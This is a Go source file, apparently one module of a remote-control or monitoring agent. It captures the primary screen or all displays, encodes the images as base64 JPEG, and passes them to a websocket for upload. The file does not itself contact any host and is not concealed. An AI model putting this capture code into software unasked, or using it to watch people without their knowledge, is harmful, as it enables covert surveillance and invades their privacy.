package surveillance

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/jpeg"

	"github.com/kbinani/screenshot"
)

// ScreenshotResult contém o resultado da captura
type ScreenshotResult struct {
	Base64Data string
	Width      int
	Height     int
}

// ScreenshotHandler captura a tela principal
// Retorna uma mensagem de confirmação; a imagem é enviada separadamente via SCREENSHOT_UPLOAD
func ScreenshotHandler(params []interface{}) (string, error) {
	// Verificar se há displays disponíveis
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return "", fmt.Errorf("no active displays found")
	}

	// Obter bounds do display principal (índice 0)
	bounds := screenshot.GetDisplayBounds(0)

	// Capturar
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("failed to capture screen: %v", err)
	}

	// Converter para JPEG com qualidade 80
	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 80})
	if err != nil {
		return "", fmt.Errorf("failed to encode image: %v", err)
	}

	// Retornar confirmação (a imagem será enviada separadamente pelo websocket)
	return fmt.Sprintf("Screenshot captured: %dx%d (%d bytes)",
		bounds.Dx(), bounds.Dy(), buf.Len()), nil
}

// GetScreenshotBase64 captura a tela e retorna como Base64
// Esta função é chamada pelo websocket para enviar o SCREENSHOT_UPLOAD
func GetScreenshotBase64() (string, error) {
	// Verificar displays
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return "", fmt.Errorf("no active displays found")
	}

	// Capturar display principal
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("failed to capture screen: %v", err)
	}

	// Converter para JPEG
	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 80})
	if err != nil {
		return "", fmt.Errorf("failed to encode image: %v", err)
	}

	// Retornar como Base64
	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

// CaptureAllDisplays captura todos os displays (para uso futuro)
func CaptureAllDisplays() ([]ScreenshotResult, error) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return nil, fmt.Errorf("no active displays found")
	}

	results := make([]ScreenshotResult, 0, n)

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			continue
		}

		var buf bytes.Buffer
		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 80}); err != nil {
			continue
		}

		results = append(results, ScreenshotResult{
			Base64Data: base64.StdEncoding.EncodeToString(buf.Bytes()),
			Width:      bounds.Dx(),
			Height:     bounds.Dy(),
		})
	}

	return results, nil
}
